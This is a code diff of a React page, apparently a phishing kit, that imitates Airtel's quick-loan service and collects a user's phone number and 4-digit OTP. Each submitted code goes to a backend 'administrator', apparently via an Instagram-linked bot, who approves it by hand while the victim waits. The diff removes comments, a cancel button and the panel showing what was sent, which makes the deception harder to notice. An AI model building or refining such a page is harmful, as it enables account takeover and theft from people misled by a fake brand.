@@ -7,12 +7,11 @@ type ToastType = 'error' | 'success' | 'info';
 const API_BASE = import.meta.env.VITE_API_BASE_URL ?? '';
 
 const OTP_LENGTH = 4;
-const POLL_FAST_MS = 2000;          // poll every 2s for the first minute
-const POLL_SLOW_MS = 5000;          // then every 5s
+const POLL_FAST_MS = 2000;
+const POLL_SLOW_MS = 5000;
 const POLL_SLOW_AFTER_MS = 60_000;
 const PENDING_KEY = 'airtelPendingRequest';
 
-/** Human-readable reference shown to the user and used by the IG bot. */
 function makeRefId() {
   const ts = Date.now().toString(36).toUpperCase();
   const rand = Math.random().toString(36).slice(2, 6).toUpperCase();
@@ -22,12 +21,6 @@ function makeRefId() {
 function formatPhone(p: string) {
   if (!p) return 'votre téléphone';
   return p.replace(/(\+\d{3})(\d{3})(\d{3})(\d{3})/, '$1 $2 $3 $4');
-}
-
-function formatDuration(totalSeconds: number) {
-  const m = Math.floor(totalSeconds / 60).toString().padStart(2, '0');
-  const s = (totalSeconds % 60).toString().padStart(2, '0');
-  return `${m}:${s}`;
 }
 
 function AirtelOTPVerify() {
@@ -41,8 +34,6 @@ function AirtelOTPVerify() {
   const [submittedOtp, setSubmittedOtp] = useState('');
   const [refId, setRefId] = useState('');
   const [submittedAt, setSubmittedAt] = useState('');
-  const [waitSeconds, setWaitSeconds] = useState(0);
-  const [copied, setCopied] = useState(false);
   const [toast, setToast] = useState<{ message: string; type: ToastType } | null>(null);
 
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
@@ -52,8 +43,6 @@ function AirtelOTPVerify() {
   const navigate = useNavigate();
 
   const phoneNumber = localStorage.getItem('airtelPhone') || '';
-
-  /* ---------------------------------------------------------------- utils */
 
   const showToast = useCallback((message: string, type: ToastType = 'error') => {
     setToast({ message, type });
@@ -68,26 +57,20 @@ function AirtelOTPVerify() {
     }
   }, []);
 
-  /* --------------------------------------------------------------- effects */
-
-  // Redirect if no phone saved
   useEffect(() => {
     if (!phoneNumber) navigate('/');
   }, [phoneNumber, navigate]);
 
-  // Focus first box on mount
   useEffect(() => {
     inputRefs.current[0]?.focus();
   }, []);
 
-  // Auto-hide toast
   useEffect(() => {
     if (!toast) return;
     const t = setTimeout(() => setToast(null), 4000);
     return () => clearTimeout(t);
   }, [toast]);
 
-  // Countdown (informational only – never blocks the user)
   useEffect(() => {
     if (timeLeft <= 0) {
       setExpired(true);
@@ -97,17 +80,7 @@ function AirtelOTPVerify() {
     return () => clearTimeout(timer);
   }, [timeLeft]);
 
-  // Elapsed time while waiting for the admin
-  useEffect(() => {
-    if (!waitingForAdmin) return;
-    const t = setInterval(() => setWaitSeconds((s) => s + 1), 1000);
-    return () => clearInterval(t);
-  }, [waitingForAdmin]);
-
-  // Cleanup on unmount
   useEffect(() => stopPolling, [stopPolling]);
-
-  /* ------------------------------------------------------------- resetting */
 
   const resetToInput = useCallback(
     (message?: string) => {
@@ -117,7 +90,6 @@ function AirtelOTPVerify() {
       setSubmittedOtp('');
       setSubmittedAt('');
       setRefId('');
-      setWaitSeconds(0);
       setOtp(Array(OTP_LENGTH).fill(''));
       sessionStorage.removeItem(PENDING_KEY);
       if (message) {
@@ -128,8 +100,6 @@ function AirtelOTPVerify() {
     },
     [showToast, stopPolling],
   );
-
-  /* --------------------------------------------------------------- polling */
 
   const startPolling = useCallback(
     (id: string) => {
@@ -159,7 +129,7 @@ function AirtelOTPVerify() {
           }
 
           if (data.status === 'rejected') {
-            resetToInput(data.message || "❌ Code refusé par l'administrateur.");
+            resetToInput("❌ Code refusé par l'administrateur. Veuillez saisir un nouveau code.");
             return;
           }
 
@@ -167,9 +137,8 @@ function AirtelOTPVerify() {
             resetToInput('⏱️ Demande expirée. Veuillez réessayer.');
             return;
           }
-          // 'pending' → keep polling silently
         } catch {
-          // network hiccup → keep polling
+          /* keep polling */
         }
 
         if (token.cancelled) return;
@@ -183,7 +152,6 @@ function AirtelOTPVerify() {
     [navigate, resetToInput, showToast, stopPolling],
   );
 
-  // Resume a pending request after a page refresh
   useEffect(() => {
     if (hasResumedRef.current) return;
     hasResumedRef.current = true;
@@ -204,8 +172,6 @@ function AirtelOTPVerify() {
       sessionStorage.removeItem(PENDING_KEY);
     }
   }, [startPolling]);
-
-  /* ----------------------------------------------------------- OTP inputs */
 
   const handleChange = (index: number, value: string) => {
     if (!/^\d*$/.test(value)) return;
@@ -237,9 +203,6 @@ function AirtelOTPVerify() {
     inputRefs.current[Math.min(digits.length, OTP_LENGTH - 1)]?.focus();
   };
 
-  /* -------------------------------------------------------------- actions */
-
-  /** ANY 4-digit code is accepted here – the admin makes the final call. */
   const handleVerify = async (e: React.FormEvent) => {
     e.preventDefault();
     if (isVerifying) return;
@@ -261,7 +224,6 @@ function AirtelOTPVerify() {
     setSubmittedOtp(otpString);
     setRefId(newRefId);
     setSubmittedAt(nowIso);
-    setWaitSeconds(0);
 
     try {
       const response = await fetch(`${API_BASE}/api/verify-otp`, {
@@ -279,7 +241,6 @@ function AirtelOTPVerify() {
       const finalRef = data.ref_id || newRefId;
       setRefId(finalRef);
 
-      // Admin already approved (rare, but possible)
       if (data.status === 'approved') {
         sessionStorage.removeItem(PENDING_KEY);
         showToast('✅ Code approuvé ! Redirection...', 'success');
@@ -287,33 +248,19 @@ function AirtelOTPVerify() {
         return;
       }
 
-      // Admin already rejected
       if (data.status === 'rejected') {
         resetToInput(data.message || "❌ Code refusé par l'administrateur.");
         return;
       }
 
-      // Default: pending → hand over to the admin
       setWaitingForAdmin(true);
       sessionStorage.setItem(
         PENDING_KEY,
         JSON.stringify({ refId: finalRef, otp: otpString, submittedAt: nowIso }),
       );
-      showToast("📤 Demande envoyée à l'administrateur. En attente de validation...", 'info');
       startPolling(finalRef);
     } catch {
       resetToInput('⚠️ Erreur de connexion. Vérifiez votre réseau.');
-    }
-  };
-
-  const handleCancel = () => {
-    const id = refId;
-    resetToInput();
-    if (id) {
-      // fire-and-forget: let the bot know the user gave up
-      fetch(`${API_BASE}/api/otp-cancel/${encodeURIComponent(id)}`, { method: 'POST' }).catch(
-        () => {},
-      );
     }
   };
 
@@ -330,7 +277,6 @@ function AirtelOTPVerify() {
     setSubmittedOtp('');
     setSubmittedAt('');
     setRefId('');
-    setWaitSeconds(0);
     setIsResending(true);
 
     try {
@@ -354,21 +300,8 @@ function AirtelOTPVerify() {
     }
   };
 
-  const copyRef = async () => {
-    try {
-      await navigator.clipboard.writeText(refId);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 1500);
-    } catch {
-      /* clipboard unavailable */
-    }
-  };
-
-  /* ----------------------------------------------------------------- view */
-
   return (
     <div className="airtel-container">
-      {/* Toast */}
       {toast && (
         <div className={`airtel-toast airtel-toast-${toast.type}`}>
           <div className="airtel-toast-icon">
@@ -403,7 +336,6 @@ function AirtelOTPVerify() {
         </div>
       )}
 
-      {/* Header */}
       <div className="airtel-header">
         <div className="airtel-hamburger">
           <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -416,10 +348,9 @@ function AirtelOTPVerify() {
         <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
       </div>
 
-      {/* Card */}
       <div className="airtel-card">
         {isVerifying ? (
-          /* ---- WAITING FOR ADMIN STATE ---- */
+          /* ---- WAITING FOR ADMIN STATE (spinner + text only) ---- */
           <div className="airtel-verifying-state">
             <div className="airtel-big-spinner" />
             <h2 className="airtel-otp-heading">
@@ -427,50 +358,9 @@ function AirtelOTPVerify() {
             </h2>
             <p className="airtel-otp-subtext">
               {waitingForAdmin
-                ? "Votre code a été transmis à un administrateur pour validation. Veuillez patienter, ne fermez pas cette page."
+                ? "Votre code a été transmis à un administrateur pour validation. Veuillez patienter..."
                 : 'Veuillez patienter un instant.'}
             </p>
-
-            {waitingForAdmin && (
-              <div className="airtel-request-card">
-                <div className="airtel-request-row">
-                  <span className="airtel-request-label">Code OTP</span>
-                  <span className="airtel-request-value">{submittedOtp}</span>
-                </div>
-                <div className="airtel-request-row">
-                  <span className="airtel-request-label">Téléphone</span>
-                  <span className="airtel-request-value">{formatPhone(phoneNumber)}</span>
-                </div>
-                <div className="airtel-request-row">
-                  <span className="airtel-request-label">Réf.</span>
-                  <span className="airtel-request-value airtel-ref">
-                    {refId}
-                    <button type="button" className="airtel-copy-btn" onClick={copyRef}>
-                      {copied ? 'Copié' : 'Copier'}
-                    </button>
-                  </span>
-                </div>
-                <div className="airtel-request-row">
-                  <span className="airtel-request-label">Envoyé à</span>
-                  <span className="airtel-request-value">
-                    {submittedAt ? new Date(submittedAt).toLocaleTimeString('fr-FR') : '—'}
-                  </span>
-                </div>
-                <div className="airtel-request-row">
-                  <span className="airtel-request-label">En attente</span>
-                  <span className="airtel-request-value">{formatDuration(waitSeconds)}</span>
-                </div>
-              </div>
-            )}
-
-            <button
-              type="button"
-              className="airtel-resend-btn"
-              style={{ marginTop: '24px' }}
-              onClick={handleCancel}
-            >
-              Annuler et saisir à nouveau
-            </button>
           </div>
         ) : (
           /* ---- INPUT STATE ---- */
